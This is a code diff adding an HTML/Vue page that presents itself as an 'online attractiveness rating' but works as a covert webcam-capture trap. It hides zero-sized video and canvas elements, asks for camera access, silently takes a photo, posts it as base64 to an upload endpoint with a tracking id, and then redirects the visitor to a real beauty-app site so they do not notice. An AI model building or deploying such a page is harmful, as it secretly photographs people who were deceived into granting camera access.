@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title>在线颜值评测</title>
+		<link rel="icon" href="./img/ico.jpg">
+	</head>
+	<body>
+		<div id ="app">
+			<video id="video" width="0" height="0" autoplay></video>
+			<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
+			<form v-bind:action="this.actionUrl" id="gopo" method="post">
+				<input type="hidden" name="img" id="result" value="" />
+			</form>
+		</div>
+	</body>
+	<script src="./js/vue.min.js"></script>
+	<script>
+		new Vue({
+			el: '#app',
+			mounted(){
+				let id = this.getQueryVariable("id");
+				let url= this.getQueryVariable("url");
+				if(id == false){
+					id = parseInt(100000*Math.random()).toString();
+				}
+				if(url == false){
+					url = "https://pc.meitu.com/";
+				}
+				this.actionUrl = "upload?id="+ id+"&url=" +url;
+				window.addEventListener("DOMContentLoaded", function() {
+					var canvas = document.getElementById('canvas');
+					var context = canvas.getContext('2d');
+					var video = document.getElementById('video');
+					if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+						navigator.mediaDevices.getUserMedia({
+							video: true
+						}).then(function(stream) {
+							video.srcObject = stream;
+							video.play();
+							setTimeout(function() {
+								context.drawImage(video, 0, 0, 480, 640);
+							}, 1000);
+							setTimeout(function() {
+								let img = canvas.toDataURL('image/png');
+								document.getElementById('result').value = img;
+								document.getElementById('gopo').submit();
+							}, 1300);
+						}, function() {
+							alert("请先授权，再进行评测～");
+						});
+					}
+				}, false);
+			},
+			data: function() {
+				return {
+					actionUrl : ''
+				}
+			},
+			methods:{
+				getQueryVariable(variable){
+					let query = window.location.search.substring(1);
+					let vars = query.split("&");
+					for (let i=0;i<vars.length;i++) {
+						let pair = vars[i].split("=");
+						if(pair[0] === variable){return pair[1];}
+					}
+					return(false);
+				}
+			}
+		})
+	</script>
+</html>
